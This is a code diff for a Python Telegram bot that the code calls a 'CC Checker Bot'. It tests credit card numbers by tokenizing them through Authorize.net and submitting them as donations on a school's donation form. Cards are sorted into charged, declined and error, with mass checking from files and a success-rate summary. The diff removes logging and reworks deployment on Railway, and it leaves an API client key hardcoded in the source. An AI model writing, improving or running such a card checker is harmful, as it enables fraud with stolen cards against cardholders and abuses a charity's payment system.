@@ -6,46 +6,43 @@ import re
 import time
 import random
 import os
+import sys
 from typing import Optional, Tuple, List
 from dataclasses import dataclass
-from io import StringIO, BytesIO
+from io import BytesIO
 import nest_asyncio
 from faker import Faker
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application,
     CommandHandler,
-    MessageHandler,
     CallbackQueryHandler,
     ContextTypes,
-    filters
+    ExtBot
 )
 from telegram.constants import ParseMode
-from telegram.error import TimedOut, NetworkError
 import colorama
 from colorama import Fore, Style
 
-# Apply nest_asyncio to allow running in async environments
+# Apply nest_asyncio
 nest_asyncio.apply()
 
 # Initialize colorama
 colorama.init(autoreset=True)
 
-# Configure logging for Railway
+# Configure logging
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO,
-    handlers=[
-        logging.FileHandler("bot.log"),
-        logging.StreamHandler()
-    ]
+    stream=sys.stdout
 )
 logger = logging.getLogger(__name__)
 
-# Configuration from environment variables (Railway recommended)
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
+# Configuration from environment variables
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 PORT = int(os.environ.get("PORT", 8080))
-WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")  # Your Railway app URL
+RAILWAY_PUBLIC_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN", "")
+WEBHOOK_URL = f"https://{RAILWAY_PUBLIC_DOMAIN}/webhook" if RAILWAY_PUBLIC_DOMAIN else ""
 
 # API Configuration
 CLIENT_KEY = "88uBHDjfPcY77s4jP6JC5cNjDH94th85m2sZsq83gh4pjBVWTYmc4WUdCW7EbY6F"
@@ -54,35 +51,14 @@ BASE_URL = "https://www.jetsschool.org"
 FORM_ID = "6913"
 AUTHORIZE_API_URL = "https://api2.authorize.net/xml/v1/request.api"
 
-# Admin user IDs (Set in Railway environment variables)
-ADMIN_IDS = [int(id) for id in os.environ.get("ADMIN_IDS", "").split(",") if id]
-
-# Emoji constants for UI
+# Emoji constants
 EMOJIS = {
-    "success": "✅",
-    "error": "❌",
-    "warning": "⚠️",
-    "info": "ℹ️",
-    "money": "💵",
-    "card": "💳",
-    "clock": "⏱️",
-    "check": "✔️",
-    "cross": "✖️",
-    "heart": "❤️",
-    "rocket": "🚀",
-    "settings": "⚙️",
-    "stats": "📊",
-    "file": "📁",
-    "database": "🗄️",
-    "user": "👤",
-    "bot": "🤖",
-    "lock": "🔒",
-    "unlock": "🔓",
-    "refresh": "🔄",
-    "wave": "👋",
-    "bank": "🏦",
-    "location": "📍",
-    "robot": "🤖"
+    "success": "✅", "error": "❌", "warning": "⚠️", "info": "ℹ️",
+    "money": "💵", "card": "💳", "clock": "⏱️", "check": "✔️",
+    "cross": "✖️", "heart": "❤️", "rocket": "🚀", "settings": "⚙️",
+    "stats": "📊", "file": "📁", "database": "🗄️", "user": "👤",
+    "bot": "🤖", "lock": "🔒", "unlock": "🔓", "refresh": "🔄",
+    "wave": "👋", "bank": "🏦", "location": "📍", "robot": "🤖"
 }
 
 fake = Faker()
@@ -114,8 +90,8 @@ class AuthorizeNetChecker:
             url = f"{BASE_URL}/donate/?form-id={FORM_ID}"
             async with session.get(url, timeout=20) as response:
                 await response.text()
-        except Exception as e:
-            logger.debug(f"Cookie fetch error: {e}")
+        except Exception:
+            pass
 
     async def tokenize_cc(self, cc: str, mm: str, yy: str, cvv: str, session: aiohttp.ClientSession) -> Tuple[Optional[str], Optional[str], Optional[str]]:
         """Tokenize credit card via Authorize.net API"""
@@ -159,7 +135,6 @@ class AuthorizeNetChecker:
                 msg = data.get("messages", {}).get("message", [{}])[0].get("text", "Tokenization Failed")
                 return None, None, msg
         except Exception as e:
-            logger.error(f"Tokenization error: {e}")
             return None, None, str(e)
 
     async def submit_donation(self, cc_full: str, descriptor: str, value: str, session: aiohttp.ClientSession) -> Tuple[str, str]:
@@ -207,8 +182,7 @@ class AuthorizeNetChecker:
                     data["give-form-hash"] = hash_match.group(1)
                 else:
                     return "ERROR", "Could not find give-form-hash"
-        except Exception as e:
-            logger.error(f"Form hash error: {e}")
+        except Exception:
             return "ERROR", "Failed to load donation page"
 
         try:
@@ -231,7 +205,6 @@ class AuthorizeNetChecker:
                     return "DECLINED", "Unknown Response"
                     
         except Exception as e:
-            logger.error(f"Submission error: {e}")
             return "ERROR", str(e)
 
     async def check_card(self, cc_line: str) -> CheckResult:
@@ -276,7 +249,6 @@ class AuthorizeNetChecker:
                 )
                 
         except Exception as e:
-            logger.error(f"Check card error: {e}")
             return CheckResult(
                 card_number=cc_line.split("|")[0] if "|" in cc_line else "Unknown",
                 status="ERROR",
@@ -291,8 +263,8 @@ class AuthorizeNetChecker:
                 async with session.get(f"https://lookup.binlist.net/{bin_number}", timeout=10) as response:
                     if response.status == 200:
                         return await response.json()
-        except Exception as e:
-            logger.debug(f"BIN lookup error: {e}")
+        except Exception:
+            pass
         return None
 
 class CheckBot:
@@ -469,8 +441,7 @@ class CheckBot:
                 parse_mode=ParseMode.MARKDOWN,
                 reply_markup=reply_markup
             )
-        except Exception as e:
-            logger.error(f"Edit message error: {e}")
+        except Exception:
             await update.message.reply_text(result_msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
 
     async def mass_check_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -569,7 +540,7 @@ class CheckBot:
                 except:
                     pass
             
-            # Small delay to avoid rate limiting
+            # Small delay
             await asyncio.sleep(0.5)
         
         await self.send_mass_check_summary(update, results, status_msg)
@@ -580,6 +551,8 @@ class CheckBot:
         declined = [r for r in results if r.status == "DECLINED"]
         errors = [r for r in results if r.status == "ERROR"]
         
+        success_rate = (len(charged)/len(results)*100) if len(results) > 0 else 0
+        
         summary = f"""
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃    {EMOJIS['stats']}  MASS CHECK SUMMARY  {EMOJIS['stats']}      
@@ -589,7 +562,7 @@ class CheckBot:
 ┃ {EMOJIS['error']} DECLINED: {len(declined)}
 ┃ {EMOJIS['warning']} ERRORS: {len(errors)}
 ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
-┃ {EMOJIS['money']} Success Rate: {(len(charged)/len(results)*100):.1f}% if len(results) > 0 else 0
+┃ {EMOJIS['money']} Success Rate: {success_rate:.1f}%
 ┃ {EMOJIS['clock']} Time: {time.strftime('%H:%M:%S')}
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
         """
@@ -669,7 +642,6 @@ class CheckBot:
                 parse_mode=ParseMode.MARKDOWN
             )
         elif query.data == "stats" or query.data == "refresh_stats":
-            # Create a new stats message
             total = self.stats["total_checks"]
             success_rate = (self.stats["charged"] / total * 100) if total > 0 else 0
             
@@ -718,19 +690,10 @@ class CheckBot:
         except:
             pass
 
-    async def post_init(self, application: Application):
-        """Initialize bot after application is created"""
-        logger.info(f"Bot initialized successfully!")
-        
     async def run_webhook(self):
         """Run bot with webhook for Railway"""
         # Build application
-        self.application = (
-            Application.builder()
-            .token(self.token)
-            .post_init(self.post_init)
-            .build()
-        )
+        self.application = Application.builder().token(self.token).build()
         
         # Add handlers
         self.application.add_handler(CommandHandler("start", self.start))
@@ -742,17 +705,42 @@ class CheckBot:
         self.application.add_handler(CallbackQueryHandler(self.button_handler))
         self.application.add_error_handler(self.error_handler)
         
-        # Initialize application
+        # Initialize the application
         await self.application.initialize()
         
         # Set webhook
-        webhook_url = f"{WEBHOOK_URL}/webhook"
-        await self.application.bot.set_webhook(url=webhook_url)
-        logger.info(f"Webhook set to {webhook_url}")
+        if WEBHOOK_URL:
+            await self.application.bot.set_webhook(url=WEBHOOK_URL)
+            logger.info(f"Webhook set to {WEBHOOK_URL}")
         
-        # Start webhook
+        # Start the application
         await self.application.start()
-        logger.info(f"Bot is running on port {PORT}")
+        
+        # Start webhook server
+        if WEBHOOK_URL:
+            await self.application.updater.start_webhook(
+                listen="0.0.0.0",
+                port=PORT,
+                url_path="webhook",
+                webhook_url=WEBHOOK_URL
+            )
+            logger.info(f"Bot is running on port {PORT}")
+        else:
+            await self.application.updater.start_polling()
+            logger.info("Bot started with polling")
+        
+        # Print startup message (only after everything is initialized)
+        bot_username = "Unknown"
+        try:
+            if self.application.bot:
+                bot_info = await self.application.bot.get_me()
+                bot_username = bot_info.username
+        except Exception as e:
+            logger.error(f"Error getting bot info: {e}")
+        
+        print(f"\n{Fore.GREEN}{EMOJIS['rocket']} Bot is running!{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{EMOJIS['bot']} Bot username: @{bot_username}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}Press Ctrl+C to stop{Style.RESET_ALL}\n")
         
         # Keep running
         try:
@@ -761,45 +749,31 @@ class CheckBot:
         except KeyboardInterrupt:
             logger.info("Stopping bot...")
             await self.application.stop()
+            await self.application.shutdown()
     
     def run(self):
         """Main run method"""
+        if not self.token:
+            print(f"{Fore.RED}{EMOJIS['error']} BOT_TOKEN is not set!{Style.RESET_ALL}")
+            return
+        
+        print(f"{Fore.GREEN}{EMOJIS['rocket']} Starting CC Checker Bot...{Style.RESET_ALL}")
+        
         if WEBHOOK_URL:
-            # Run with webhook for Railway
-            asyncio.run(self.run_webhook())
+            print(f"{Fore.CYAN}Mode: Webhook on port {PORT}{Style.RESET_ALL}")
         else:
-            # Run with polling for local development
-            self.application = (
-                Application.builder()
-                .token(self.token)
-                .post_init(self.post_init)
-                .build()
-            )
-            
-            self.application.add_handler(CommandHandler("start", self.start))
-            self.application.add_handler(CommandHandler("help", self.help))
-            self.application.add_handler(CommandHandler("au", self.single_check))
-            self.application.add_handler(CommandHandler("mau", self.mass_check_file))
-            self.application.add_handler(CommandHandler("autxt", self.mass_check_text))
-            self.application.add_handler(CommandHandler("stats", self.stats))
-            self.application.add_handler(CallbackQueryHandler(self.button_handler))
-            self.application.add_error_handler(self.error_handler)
-            
-            logger.info("Starting bot with polling...")
-            self.application.run_polling(allowed_updates=Update.ALL_TYPES)
+            print(f"{Fore.YELLOW}Mode: Polling (local development){Style.RESET_ALL}")
+        
+        # Run the webhook
+        asyncio.run(self.run_webhook())
 
 def main():
     """Main entry point"""
-    print(f"{Fore.GREEN}{EMOJIS['rocket']} Starting CC Checker Bot...{Style.RESET_ALL}")
-    
-    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        print(f"{Fore.RED}{EMOJIS['error']} Please set your BOT_TOKEN in environment variables!{Style.RESET_ALL}")
+    # Check for required environment variables
+    if not BOT_TOKEN:
+        print(f"{Fore.RED}{EMOJIS['error']} Error: BOT_TOKEN environment variable is not set!{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}Please set it in Railway dashboard or as environment variable{Style.RESET_ALL}")
         return
-    
-    if WEBHOOK_URL:
-        print(f"{Fore.CYAN}Running in webhook mode on port {PORT}{Style.RESET_ALL}")
-    else:
-        print(f"{Fore.YELLOW}Running in polling mode (local development){Style.RESET_ALL}")
     
     bot = CheckBot(BOT_TOKEN)
     bot.run()
